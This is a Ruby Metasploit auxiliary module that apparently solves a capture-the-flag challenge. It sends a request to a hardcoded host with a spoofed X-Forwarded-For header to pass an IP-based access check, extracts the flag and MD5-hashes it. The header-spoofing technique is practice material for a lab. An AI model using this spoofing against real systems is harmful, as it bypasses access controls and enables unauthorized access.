#!/usr/bin/env ruby

require 'msf/core'  # Metasploit module

class MetasploitModule < Msf::Auxiliary

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  require 'digest'  # MD5 Module

  def initialize
    super(
      'Name'        => 'Atenea: Solo para empleados Solver',
      'Description' => 'Get the flag using some X-Forwarding techniques and convert it in a valid flag using MD5 algorithm',
      'Author'      => ['CosasDePuma <https://github.com/cosasdepuma>'],
      'Privileged'  => 'false',
      'License'     => MSF_LICENSE
    )

    deregister_options('Proxies', 'VHOST', 'SSL') # HttpClient

    deregister_options(                           # Advanced Options
      'DOMAIN', 'DigestAuthIIS', 'FingerprintCheck', 'HttpClientTimeout',
      'HttpPassword', 'HttpTrace', 'HttpUsername', 'SSLVersion', 'WORKSPACE'
      )

    register_options([
      Opt::RHOST('85.159.210.133'),               # Override RHOST Option

      OptAddress.new('FORWARD', [true, 'IP address from which the request is made (ccn-cert.cni.es)', '107.154.38.234']),
      OptString.new('TARGETURI', [true, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/36e1889b/'])
    ], self.class)
  end


  def run
    begin
      # Send a custom GET request to the server
      print_status('Sending GET request...')
      res = send_request_cgi({
        'uri'     => target_uri.path,
        'method'  => 'GET',
        'headers' => {
          'X-Forwarded-For' => datastore['FORWARD']
        }
      })

      # Get the body of the request
      flag = res.get_html_document.to_s
      # Grep only the flag line
      flag = flag.scan(/flag.+/)[0]

      print_status("Detected #{flag}")

      # Format the flag according to the Athena's specifications
      flag = flag.sub(/flag:\ /, '').strip
      flag = Digest::MD5.hexdigest(flag)
      flag = "flag{#{flag}}"

      print_good("Solved: #{flag}")
    rescue
      print_error('Unhandled exception during execution')
    end
  end

end
